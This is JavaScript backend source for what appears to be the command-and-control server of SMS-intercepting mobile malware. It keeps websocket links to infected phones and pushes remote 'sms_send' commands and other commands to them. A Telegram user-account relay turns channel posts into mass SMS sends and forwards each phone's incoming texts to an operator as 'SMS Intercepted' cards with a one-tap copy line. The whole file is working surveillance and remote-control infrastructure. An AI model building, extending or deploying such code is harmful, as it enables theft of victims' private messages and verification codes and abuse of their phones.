"use strict";

const { ObjectId } = require("mongodb");
const config = require("./config");
const db = require("./database");
const u = require("./utils");

// ------------------------------------------------------------------ spawn

function spawn(p) {
  if (p && typeof p.catch === "function") p.catch(() => {});
  return p;
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// -------------------------------------------------------------- device hub

function sendJson(ws, payload) {
  return new Promise((resolve, reject) => {
    if (!ws || ws.readyState !== 1) return reject(new Error("socket not open"));
    ws.send(JSON.stringify(payload), (err) => (err ? reject(err) : resolve()));
  });
}

class Hub {
  constructor() {
    this.deviceSockets = new Map();
    this.lastPong = new Map();
    this._hbStarted = false;
  }

  async addDevice(deviceId, ws) {
    const id = String(deviceId);
    const old = this.deviceSockets.get(id);
    if (old && old !== ws) {
      try { old.close(4001, "replaced"); } catch (_) {}
    }
    this.deviceSockets.set(id, ws);
    this.lastPong.set(id, Date.now() / 1000);
    if (!this._hbStarted) {
      this._hbStarted = true;
      spawn(heartbeatLoop());
    }
  }

  async removeDevice(deviceId, ws) {
    const id = String(deviceId);
    if (this.deviceSockets.get(id) === ws) {
      this.deviceSockets.delete(id);
      this.lastPong.delete(id);
    }
  }

  touch(deviceId) {
    this.lastPong.set(String(deviceId), Date.now() / 1000);
  }

  online(deviceId) {
    return this.deviceSockets.has(String(deviceId));
  }

  get onlineCount() {
    return this.deviceSockets.size;
  }

  async sendToDevice(deviceId, payload) {
    const id = String(deviceId);
    const ws = this.deviceSockets.get(id);
    if (!ws) return false;
    try {
      await sendJson(ws, payload);
      this.touch(id);
      return true;
    } catch (_) {
      await this.removeDevice(id, ws);
      return false;
    }
  }
}

const hub = new Hub();

async function heartbeatLoop() {
  for (;;) {
    await sleep(Math.max(5, config.WS_PING_INTERVAL) * 1000);
    const now = Date.now() / 1000;
    const payload = JSON.stringify({ type: "ping", ts: Math.floor(now) });

    for (const [id, ws] of [...hub.deviceSockets]) {
      const last = hub.lastPong.get(id) || 0;
      if (now - last > config.WS_IDLE_TIMEOUT) {
        try { ws.close(4000, "idle"); } catch (_) {}
        await hub.removeDevice(id, ws);
        continue;
      }
      try {
        if (ws.readyState === 1) ws.send(payload);
      } catch (_) {
        await hub.removeDevice(id, ws);
      }
    }
  }
}

// --------------------------------------------------------------- admin hub

class AdminHub {
  constructor() {
    this.sockets = new Set();
  }

  add(ws) { this.sockets.add(ws); }
  remove(ws) { this.sockets.delete(ws); }

  async broadcast(payload) {
    const data = JSON.stringify(payload);
    const tasks = [];
    for (const ws of [...this.sockets]) {
      if (!ws || ws.readyState !== 1) { this.remove(ws); continue; }
      tasks.push(
        new Promise((resolve) => {
          try {
            ws.send(data, (err) => {
              if (err) this.remove(ws);
              resolve();
            });
          } catch (_) {
            this.remove(ws);
            resolve();
          }
        })
      );
    }
    if (tasks.length) await Promise.allSettled(tasks);
  }
}

const adminHub = new AdminHub();

// ------------------------------------------------------------- broadcasts

function broadcast(payload) {
  spawn(adminHub.broadcast(payload));
}

function broadcastMessage(doc) {
  if (!doc) return;
  try { broadcast({ type: "message", data: u.serializeDocument(doc) }); } catch (_) {}
}

function broadcastDevice(deviceId, extra = null) {
  broadcast({ type: "device_status", data: { id: String(deviceId), ...(extra || {}) } });
}

function broadcastBuild(userId, payload) {
  try { broadcast({ type: "build", data: { ...payload, userId } }); } catch (_) {}
}

// ---------------------------------------------------------------- commands

async function sendCommand(deviceId, action, extra = null) {
  const payload = { type: "command", action, ts: Math.floor(Date.now() / 1000) };
  if (extra) Object.assign(payload, extra);
  return hub.sendToDevice(deviceId, payload);
}

// ------------------------------------------------------------------ outbox

function pushRow(deviceId, row) {
  const payload = {
    type: "sms_send",
    id: String(row._id),
    to: row.to || "",
    body: row.body || "",
  };
  const slot = row.sim_slot;
  if (slot !== null && slot !== undefined) {
    const n = parseInt(slot, 10);
    if (Number.isFinite(n)) payload.sim_slot = n;
  }
  return payload;
}

async function deliverOutboxRow(deviceId, outboxId) {
  let row;
  try {
    row = await db.outbox.findOne({ _id: new ObjectId(String(outboxId)) });
  } catch (_) {
    return false;
  }
  if (!row) return false;
  if (row.status === "sent") return true;

  const ok = await hub.sendToDevice(deviceId, pushRow(deviceId, row));
  if (ok) {
    try {
      await db.outbox.updateOne(
        { _id: row._id, status: { $ne: "sent" } },
        { $set: { pushed_at: db.utcNow(), updated_at: db.utcNow() }, $inc: { attempts: 1 } }
      );
    } catch (_) {}
  }
  return ok;
}

async function pushOutbox(deviceId) {
  let pending;
  try {
    pending = await db.outbox
      .find({ device_id: String(deviceId), status: { $in: ["pending", "queued"] } })
      .sort({ _id: 1 })
      .limit(20)
      .toArray();
  } catch (_) {
    return 0;
  }
  let n = 0;
  for (const row of pending) {
    if (await deliverOutboxRow(deviceId, String(row._id))) n += 1;
  }
  return n;
}

async function repushStale(deviceId) {
  const cutoff = new Date(Date.now() - config.OUTBOX_REPUSH_AFTER * 1000);
  const stuck = new Date(Date.now() - config.SEND_STUCK_AFTER * 1000);
  let stale;
  try {
    stale = await db.outbox
      .find({
        device_id: String(deviceId),
        status: { $ne: "sent" },
        $or: [
          { status: "pending", pushed_at: { $lt: cutoff } },
          { status: "queued", updated_at: { $lt: stuck } },
        ],
      })
      .limit(10)
      .toArray();
  } catch (_) {
    return;
  }
  for (const row of stale) await deliverOutboxRow(deviceId, String(row._id));
}

async function queueSms(deviceId, body, to, source = "panel", deviceName = "", simSlot = null) {
  if (!deviceId) throw new u.HttpError(400, "deviceId required");
  const now = db.utcNow();
  const dest = u.normalizeNumber(to) || String(to || "").trim();
  const slot =
    simSlot === null || simSlot === undefined || simSlot === ""
      ? null
      : parseInt(simSlot, 10);

  const msgId = await u.insertMessage(
    {
      device_id: String(deviceId),
      device_name: deviceName || "Unknown",
      direction: "out",
      address: dest || "",
      body,
      kind: "sms",
      status: "queued",
      source,
      sim_slot: Number.isFinite(slot) ? slot : null,
      created_at: now,
    },
    false
  );

  const res = await db.outbox.insertOne({
    device_id: String(deviceId),
    to: dest || "",
    body,
    source,
    status: "pending",
    sim_slot: Number.isFinite(slot) ? slot : null,
    message_id: msgId || null,
    attempts: 0,
    pushed_at: null,
    created_at: now,
    updated_at: now,
  });

  if (msgId) {
    try { broadcastMessage(await db.messages.findOne({ _id: msgId })); } catch (_) {}
  }

  return [String(res.insertedId), msgId ? String(msgId) : ""];
}

// ----------------------------------------------------------------- targets

function slotsFor(payloadSlots, device) {
  const sel = u.normSlots(payloadSlots);
  if (sel.length) return sel;
  const a = u.autoSenderOf(device || {});
  if (a.sim_slots.length) return a.sim_slots;
  return [null];
}

function onlineDeviceIds() {
  const out = [];
  for (const k of hub.deviceSockets.keys()) {
    try {
      out.push(new ObjectId(k));
    } catch (_) {}
  }
  return out;
}

async function resolveTargets(payload = {}) {
  if (payload.target === "device") {
    if (!payload.device_id) throw new u.HttpError(400, "device_id required for target=device");
    return [[await u.getDeviceOr404(payload.device_id)], false];
  }

  if (payload.target === "online") {
    const ids = onlineDeviceIds();
    if (!ids.length) return [[], false];
    return [await db.devices.find({ _id: { $in: ids } }).toArray(), false];
  }

  let total = 0;
  try { total = await db.devices.countDocuments({}); } catch (_) {}
  const rows = await db.devices.find().limit(config.MAX_BROADCAST).toArray();
  return [rows, total > config.MAX_BROADCAST];
}

// ----------------------------------------------------------------- cleanup

async function closeSockets() {
  for (const ws of hub.deviceSockets.values()) {
    try { ws.close(1001, "shutdown"); } catch (_) {}
  }
  for (const ws of adminHub.sockets) {
    try { ws.close(1001, "shutdown"); } catch (_) {}
  }
  hub.deviceSockets.clear();
  hub.lastPong.clear();
  adminHub.sockets.clear();
}

async function pruneCollection(name, limit, sort = { _id: 1 }) {
  if (!limit || limit <= 0) return;
  const col = db[name];
  if (!col) return;
  const n = await col.countDocuments({});
  if (n <= limit) return;
  const extra = n - limit;
  const victims = await col
    .find({}, { projection: { _id: 1 } })
    .sort(sort)
    .limit(extra)
    .toArray();
  if (victims.length) await col.deleteMany({ _id: { $in: victims.map((r) => r._id) } });
}

async function pruneEventsLoop() {
  for (;;) {
    await sleep(3600 * 1000);
    for (const [name, limit] of [
      ["device_events", config.EVENT_PRUNE_LIMIT],
      ["tg_logs", config.TG_LOG_LIMIT],
      ["activity_logs", config.ACTIVITY_LOG_LIMIT],
    ]) {
      try {
        await pruneCollection(name, limit);
      } catch (_) {}
    }
  }
}

module.exports = {
  hub,
  adminHub,
  spawn,
  sendJson,
  heartbeatLoop,
  broadcast,
  broadcastMessage,
  broadcastDevice,
  broadcastBuild,
  sendCommand,
  pushRow,
  deliverOutboxRow,
  pushOutbox,
  repushStale,
  queueSms,
  slotsFor,
  onlineDeviceIds,
  resolveTargets,
  closeSockets,
  pruneEventsLoop,
};



backend/relay.js


"use strict";

const fs = require("fs");
const express = require("express");
const config = require("./config");
const db = require("./database");
const u = require("./utils");
const hub = require("./hub");
const auth = require("./auth");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);

// html-escaper optional -> local fallback
let escapeHtml;
try {
  escapeHtml = require("html-escaper").escape;
} catch (_) {
  const MAP = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
  escapeHtml = (s) => String(s === null || s === undefined ? "" : s).replace(/[&<>"']/g, (c) => MAP[c]);
}

// ---- gramjs (Telethon ka JS equivalent) ----
let TelegramClient = null, Api = null, StringSession = null, NewMessage = null;
let TELETHON_OK = false;
try {
  TelegramClient = require("telegram").TelegramClient;
  StringSession = require("telegram/sessions").StringSession;
  Api = require("telegram/tl").Api;
  NewMessage = require("telegram/events").NewMessage;
  TELETHON_OK = true;
} catch (_) {
  TELETHON_OK = false;
}

// ------------------------------------------------------------------ state

let relayClient = null;
let _connectPromise = null;

const relayState = {
  connected: false,
  authorized: false,
  me: null,
  phone: null,
  phoneCodeHash: null,
  awaiting_code: false,
  handlers_installed: false,
  last_error: null,
  forward_user: config.DEFAULT_FWD_USER || null,
  last_channel_at: null,
  api_id: null,
  api_hash: null,
};

const _relaySeen = new Set();
const bannedCache = new Set();

const _pTo = /To:\s*(\+?\d{7,15})/;
const _pMsg = /Message:\s*(.+?)(?=\n\n|\n[📋📞💬📱]|$)/s;
const _pOnetap = /(\+?\d{7,15})\s*\|\s*(.+)/;
const _pDev = /^\s*(?:Device|DEV|#)\s*[:#]?\s*([A-Za-z0-9][A-Za-z0-9_\-]{2,39})\s*$/m;

// ----------------------------------------------------------------- parsing

function cleanSmsBody(raw) {
  const lines = String(raw || "")
    .split("\n")
    .map((l) => l.trim())
    .filter((l) => l && !l.startsWith("━"));
  return lines.join(" ").trim().slice(0, config.MAX_SMS_BODY);
}

function parseSms(text) {
  if (!text) return null;

  let to = null, body = null;
  let m = _pTo.exec(text);
  if (m) to = u.normalizeNumber(m[1]) || String(m[1]).trim();

  m = _pMsg.exec(text);
  if (m) body = m[1];

  if (!body) {
    m = _pOnetap.exec(text);
    if (m) {
      to = to || u.normalizeNumber(m[1]) || String(m[1]).trim();
      body = m[2];
    }
  }
  if (!body) return null;

  let hint = null;
  m = _pDev.exec(text);
  if (m) hint = m[1];

  return [to, cleanSmsBody(body), hint];
}

function formatSmsCard(address, body, header = "📱 <b>SMS Intercepted</b>", note = null) {
  const a = escapeHtml(address || "n/a");
  const b = escapeHtml(body || "");
  const lines = [header, "━━━━━━━━━━━━━━", `📞 To: <code>${a}</code>`, `💬 Message: ${b}`];
  if (note) lines.push(`ℹ️ ${note}`);
  lines.push("", "📋 <b>One-tap copy:</b>", `<code>${a} | ${b}</code>`);
  return lines.join("\n");
}

// ------------------------------------------------------------------- bans

function banKey(address) {
  if (address === null || address === undefined) return "";
  const num = u.normalizeNumber(address);
  if (num) return num;
  return String(address).trim().toLowerCase();
}

function loadBans() {
  bannedCache.clear();
  return db.banned_senders
    .find({}, { projection: { address: 1, sender: 1 } })
    .forEach((d) => {
      const k = banKey(d.address || d.sender);
      if (k) bannedCache.add(k);
    })
    .catch(() => {});
}

async function loadRelayConfig() {
  try {
    const doc = (await db.relay_config.findOne({ _id: "forward" })) || {};
    if (doc.target) relayState.forward_user = doc.target;
  } catch (_) {}
}

function isBanned(address) {
  const k = banKey(address);
  return !!k && bannedCache.has(k);
}

// ------------------------------------------------------------------ creds

async function relayCreds() {
  if (config.TELE_API_ID && config.TELE_API_HASH) {
    return [config.TELE_API_ID, config.TELE_API_HASH];
  }
  let doc = {};
  try { doc = (await db.relay_config.findOne({ _id: "creds" })) || {}; } catch (_) {}
  return [parseInt(doc.api_id || 0, 10), doc.api_hash || ""];
}

async function saveRelayCreds(apiId, apiHash, phone) {
  try {
    await db.relay_config.updateOne(
      { _id: "creds" },
      { $set: { api_id: apiId, api_hash: apiHash, phone, updated_at: db.utcNow() } },
      { upsert: true }
    );
  } catch (_) {}
}

function loadSession() {
  try {
    if (fs.existsSync(config.RELAY_SESSION_FILE)) {
      const s = fs.readFileSync(config.RELAY_SESSION_FILE, "utf8").trim();
      if (s) return new StringSession(s);
    }
  } catch (_) {}
  return new StringSession("");
}

function saveSession() {
  try {
    if (relayClient && relayClient.session && typeof relayClient.session.save === "function") {
      const tmp = `${config.RELAY_SESSION_FILE}.tmp`;
      fs.writeFileSync(tmp, relayClient.session.save(), { mode: 0o600 });
      fs.renameSync(tmp, config.RELAY_SESSION_FILE);
    }
  } catch (_) {}
}

// -------------------------------------------------------------- relay boot

async function startRelay() {
  if (!TELETHON_OK) {
    relayState.last_error = "gramjs not installed (npm i telegram)";
    return;
  }

  const [apiId, apiHash] = await relayCreds();
  if (!apiId || !apiHash) {
    relayState.last_error = "TELE_API_ID / TELE_API_HASH not set";
    return;
  }

  try {
    relayClient = new TelegramClient(loadSession(), apiId, apiHash, {
      connectionRetries: 5,
      useWSS: false,
    });
    await relayClient.connect();
    relayState.connected = true;

    if (await relayClient.isUserAuthorized()) {
      await afterRelayLogin(apiId, apiHash);
    } else {
      relayState.awaiting_code = true;
    }
  } catch (e) {
    relayState.connected = false;
    relayState.last_error = `connect: ${e.message || e}`;
  }
}

async function stopRelay() {
  saveSession();
  try { await relayClient?.disconnect(); } catch (_) {}
  relayState.connected = false;
}

async function afterRelayLogin(apiId = null, apiHash = null) {
  const me = await relayClient.getMe();
  relayState.authorized = true;
  relayState.awaiting_code = false;
  relayState.me = { id: me.id, username: me.username, first_name: me.firstName };
  installRelayHandlers();
  await loadBans();
  if (apiId && apiHash) await saveRelayCreds(apiId, apiHash, relayState.phone);
  saveSession();
  try {
    await normalizeAutoSenderChannels();
  } catch (e) {
    relayState.last_error = `channel normalize: ${e.message || e}`;
  }
  u.logEvent("relay_login", relayState.me);
}

// -------------------------------------------------- enabled channels cache

let _enabledKeysCache = { at: 0, keys: new Set() };

function invalidateChannelCache() {
  _enabledKeysCache = { at: 0, keys: new Set() };
}

async function enabledChannels() {
  const out = new Set();
  try {
    const cur = db.devices.find(
      { "auto_sender.enabled": true },
      { projection: { auto_sender: 1 } }
    );
    for await (const d of cur) {
      const cid = (d.auto_sender || {}).channel_id;
      if (cid) out.add(String(cid));
    }
  } catch (_) {}
  if (config.TARGET_CHANNEL_ID) out.add(String(config.TARGET_CHANNEL_ID));
  return out;
}

async function enabledChannelKeys() {
  const now = Date.now() / 1000;
  if (_enabledKeysCache.keys.size && now - _enabledKeysCache.at < 5) {
    return _enabledKeysCache.keys;
  }
  const fresh = new Set();
  for (const c of await enabledChannels()) {
    const k = u.chanKey(c);
    if (k) fresh.add(k);
  }
  _enabledKeysCache = { at: now, keys: fresh };
  return fresh;
}

async function devicesForChannel(channelId) {
  const key = u.chanKey(channelId);
  if (!key) return [];
  try {
    const rows = await db.devices
      .find({ "auto_sender.enabled": true })
      .limit(config.MAX_BROADCAST)
      .toArray();
    return rows.filter((d) => u.chanKey((d.auto_sender || {}).channel_id) === key);
  } catch (_) {
    return [];
  }
}

async function normalizeAutoSenderChannels() {
  if (!relayClient || !relayState.authorized) return;
  let rows;
  try {
    rows = await db.devices
      .find({ "auto_sender.channel_id": { $nin: [null, ""] } })
      .limit(config.MAX_BROADCAST)
      .toArray();
  } catch (_) {
    return;
  }

  let changed = 0;
  for (const d of rows) {
    const cid = (d.auto_sender || {}).channel_id;
    if (!cid) continue;
    const s = String(cid);
    if (/^-100\d+$/.test(s)) continue;
    let ent;
    try {
      ent = await relayClient.getEntity(u.asEntity(cid));
    } catch (_) {
      continue;
    }
    const nid = u.canonicalChannelId(ent);
    if (!nid || nid === s) continue;
    try {
      await db.devices.updateOne({ _id: d._id }, { $set: { "auto_sender.channel_id": nid } });
      changed += 1;
    } catch (_) {}
  }
  if (changed) {
    invalidateChannelCache();
    u.logEvent("auto_sender_channels_normalized", { count: changed });
  }
}

// ---------------------------------------------------------------- handlers

function installRelayHandlers() {
  if (relayState.handlers_installed || !relayClient || !TELETHON_OK) return;
  relayClient.addEventHandler(onRelayMessage, new NewMessage({ incoming: true }));
  relayState.handlers_installed = true;
}

async function resolveRelayTargets(hint) {
  const limit = config.MAX_BROADCAST;

  if (hint) {
    const h = String(hint).trim().toLowerCase();
    const rows = await db.devices.find().limit(limit).toArray().catch(() => []);
    for (const d of rows) {
      if (
        (d.device_name || "").toLowerCase().includes(h) ||
        u.deviceShortId(d).toLowerCase() === h ||
        String(d._id).toLowerCase() === h
      ) {
        return [d];
      }
    }
    return [];
  }

  const ids = hub.onlineDeviceIds();
  if (ids.length) {
    return db.devices.find({ _id: { $in: ids } }).toArray().catch(() => []);
  }
  return db.devices.find().limit(limit).toArray().catch(() => []);
}

async function onRelayMessage(event) {
  try {
    const chatId = event && event.chatId;
    const mid = event && event.message && event.message.id;
    if (chatId === null || chatId === undefined) return;

    const key = `${chatId}:${mid}`;
    if (_relaySeen.has(key)) return;
    _relaySeen.add(key);
    if (_relaySeen.size > 8000) _relaySeen.clear();

    if (!(await enabledChannelKeys()).has(u.chanKey(chatId))) return;

    relayState.last_channel_at = db.utcNow().toISOString();

    const parsed = parseSms((event.message && event.message.message) || "");
    if (!parsed) return;
    const [toNumber, body, hint] = parsed;

    let targets = await devicesForChannel(chatId);
    if (!targets.length && hint) targets = await resolveRelayTargets(hint);
    if (
      !targets.length &&
      config.TARGET_CHANNEL_ID &&
      u.chanKey(chatId) === u.chanKey(config.TARGET_CHANNEL_ID)
    ) {
      targets = await resolveRelayTargets(null);
    }
    if (!targets.length) return;

    for (const d of targets) {
      const did = String(d._id);
      const to = toNumber || u.resolveDeviceNumber(d);
      const a = u.autoSenderOf(d);
      const slots = a.sim_slots.length ? a.sim_slots : [null];

      for (const slot of slots) {
        await hub.queueSms(did, body, to, "relay", d.device_name || "", slot);
      }
      if (hub.hub.online(did)) hub.spawn(hub.pushOutbox(did));

      if (a.tg_confirm) {
        let note = slots[0] === null ? "SIM default" : "SIM " + slots.map((s) => s + 1).join("+");
        note += " · device " + u.deviceShortId(d);
        hub.spawn(relaySendText(formatSmsCard(to || "", body, "📤 <b>Auto Sender → SMS</b>", note)));
      }
    }
    u.logEvent("relay_channel_send", {
      to: toNumber,
      devices: targets.length,
      channel: String(chatId),
    });
  } catch (e) {
    relayState.last_error = `channel: ${e.message || e}`;
    u.logEvent("relay_channel_error", { error: String(e.message || e) });
  }
}

// --------------------------------------------------------------- sending

async function relaySendText(text) {
  const target = relayState.forward_user || config.DEFAULT_FWD_USER;
  if (!relayClient || !relayState.authorized || !target) return false;

  const ent = /^-?\d+$/.test(String(target)) ? parseInt(target, 10) : String(target);

  try {
    await relayClient.sendMessage(ent, { message: text, parseMode: "html" });
    tgLog("out", text, "ok");
    return true;
  } catch (e) {
    try {
      // parseMode support na ho to plain bhejo
      await relayClient.sendMessage(ent, { message: String(text).replace(/<[^>]+>/g, "") });
      tgLog("out", text, "ok-plain");
      return true;
    } catch (e2) {
      relayState.last_error = `forward: ${e2.message || e2}`;
      tgLog("out", text, `fail: ${e2.message || e2}`);
      return false;
    }
  }
}

const notifyAdmins = relaySendText;

async function relayForwardIncoming(device, address, body) {
  if (!body || isBanned(address)) return;
  await relaySendText(formatSmsCard(address || "n/a", body));
}

async function tgLog(direction, text, result = "ok") {
  try {
    await db.tg_logs.insertOne({
      direction,
      text: String(text || "").slice(0, 400),
      result: String(result || "ok").slice(0, 200),
      created_at: db.utcNow(),
    });
  } catch (_) {}
}

